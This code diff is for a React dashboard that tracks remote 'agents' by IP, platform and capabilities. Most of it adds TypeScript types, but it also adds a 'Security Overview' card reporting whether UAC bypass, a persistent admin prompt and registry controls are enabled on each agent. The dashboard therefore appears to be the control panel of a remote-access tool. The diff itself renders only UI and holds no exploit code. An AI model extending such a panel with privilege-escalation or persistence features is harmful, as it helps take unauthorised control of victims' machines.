@@ -27,9 +27,9 @@ import { ActivityFeed } from "./components/ActivityFeed";
  const VideoPlayerLazy = lazy(() =>
    import("./components/VideoPlayer").then((mod) => ({ default: mod.VideoPlayer }))
  );
- import { ThemeProvider } from "./components/ThemeProvider";
- import { ErrorBoundary } from "./components/ErrorBoundary";
- import { Login } from "./components/Login";
+import { ThemeProvider } from "./components/ThemeProvider";
+import { ErrorBoundary } from "./components/ErrorBoundary";
+import { Login } from "./components/Login";
 import {
   Tabs,
   TabsContent,
@@ -56,6 +56,21 @@ import {
   Wifi,
 } from "lucide-react";
 
+interface Agent {
+  id: string;
+  name: string;
+  status: "online" | "offline";
+  platform: string;
+  ip: string;
+  lastSeen: Date;
+  capabilities: string[];
+  performance: {
+    cpu: number;
+    memory: number;
+    network: number;
+  };
+}
+
 type FilterOptions = {
   status: string[];
   platform: string[];
@@ -65,12 +80,17 @@ type FilterOptions = {
 // Live agents come from SocketProvider via agent_list_update
 
 function AppContent() {
-  const { agents: liveAgents, connected, authenticated } = useSocket();
+  const { agents: liveAgents, connected, authenticated, agentConfig } = useSocket() as {
+    agents: Agent[];
+    connected: boolean;
+    authenticated: boolean;
+    agentConfig: Record<string, any>;
+  };
   const [selectedAgent, setSelectedAgent] = useState<
     string | null
   >(null);
   const [activeTab, setActiveTab] = useState("overview");
-  const [agents, setAgents] = useState(liveAgents);
+  const [agents, setAgents] = useState<Agent[]>(liveAgents as Agent[]);
   const [networkActivity, setNetworkActivity] = useState("0.0");
 
   useEffect(() => {
@@ -105,12 +125,12 @@ function AppContent() {
   }
 
   const onlineAgents = agents.filter(
-    (agent) => agent.status === "online",
+    (agent: Agent) => agent.status === "online",
   );
 
   // Advanced filtering and sorting
   const filteredAgents = agents
-    .filter((agent) => {
+    .filter((agent: Agent) => {
       // Text search
       const matchesSearch =
         searchTerm === "" ||
@@ -148,7 +168,7 @@ function AppContent() {
         matchesCapabilities
       );
     })
-    .sort((a, b) => {
+    .sort((a: Agent, b: Agent) => {
       let aValue, bValue;
 
       switch (sortBy) {
@@ -180,15 +200,15 @@ function AppContent() {
       }
     });
 
-  const availableFilters = {
+  const availableFilters: { platforms: string[]; capabilities: string[] } = {
     platforms: [
       ...new Set(
-        agents.map((agent) => agent.platform.split(" ")[0]),
+        agents.map((agent: Agent) => agent.platform.split(" ")[0]),
       ),
-    ],
+    ] as string[],
     capabilities: [
-      ...new Set(agents.flatMap((agent) => agent.capabilities)),
-    ],
+      ...new Set(agents.flatMap((agent: Agent) => agent.capabilities)),
+    ] as string[],
   };
 
   const handleAgentSelect = () => {
@@ -378,6 +398,65 @@ function AppContent() {
                             agentCount={onlineAgents.length}
                             selectedAgent={selectedAgent}
                           />
+                          <Card>
+                            <CardHeader>
+                              <CardTitle>Security Overview</CardTitle>
+                              <CardDescription>
+                                UAC bypass and registry status
+                              </CardDescription>
+                            </CardHeader>
+                            <CardContent>
+                              {(() => {
+                                const aid = selectedAgent || (onlineAgents[0]?.id ?? null);
+                                const cfg = aid ? agentConfig?.[aid] : null;
+                                const bEnabled = Boolean(cfg?.bypasses?.enabled);
+                                const rEnabled = Boolean(cfg?.registry?.enabled);
+                                const uacEnabled = Boolean(cfg?.agent?.enableUACBypass);
+                                const pPrompt = Boolean(cfg?.agent?.persistentAdminPrompt);
+                                const methods = cfg?.bypasses?.methods || {};
+                                const actions = cfg?.registry?.actions || {};
+                                const methodCount = Object.values(methods).filter(Boolean).length;
+                                const actionCount = Object.values(actions).filter(Boolean).length;
+                                return (
+                                  <div className="space-y-3">
+                                    <div className="flex items-center justify-between">
+                                      <span className="text-sm">UAC Bypass</span>
+                                      <Badge variant={uacEnabled && bEnabled ? "default" : "secondary"}>
+                                        {uacEnabled && bEnabled ? "Enabled" : "Disabled"}
+                                      </Badge>
+                                    </div>
+                                    <div className="flex items-center justify-between">
+                                      <span className="text-sm">Persistent Admin Prompt</span>
+                                      <Badge variant={pPrompt ? "default" : "secondary"}>
+                                        {pPrompt ? "On" : "Off"}
+                                      </Badge>
+                                    </div>
+                                    <div className="flex items-center justify-between">
+                                      <span className="text-sm">Registry Controls</span>
+                                      <Badge variant={rEnabled ? "default" : "secondary"}>
+                                        {rEnabled ? "Enabled" : "Disabled"}
+                                      </Badge>
+                                    </div>
+                                    <div className="flex items-center justify-between">
+                                      <span className="text-sm">Enabled UAC Methods</span>
+                                      <Badge variant="secondary">{methodCount}</Badge>
+                                    </div>
+                                    <div className="flex items-center justify-between">
+                                      <span className="text-sm">Enabled Registry Actions</span>
+                                      <Badge variant="secondary">{actionCount}</Badge>
+                                    </div>
+                                    {aid && cfg ? (
+                                      <div className="text-xs text-muted-foreground">
+                                        Agent {aid.slice(0, 8)} • Updated {cfg.updatedAt ? new Date(cfg.updatedAt).toLocaleTimeString() : "—"}
+                                      </div>
+                                    ) : (
+                                      <div className="text-xs text-muted-foreground">Select an agent to view security overview</div>
+                                    )}
+                                  </div>
+                                );
+                              })()}
+                            </CardContent>
+                          </Card>
                         </div>
                       </div>
                     </CardContent>
@@ -395,7 +474,7 @@ function AppContent() {
                   className="space-y-6"
                 >
                   <div className="grid grid-cols-1 lg:grid-cols-2 xl:grid-cols-3 gap-6">
-                    {filteredAgents.map((agent) => (
+                    {filteredAgents.map((agent: Agent) => (
                       <AgentCard
                         key={agent.id}
                         agent={agent}
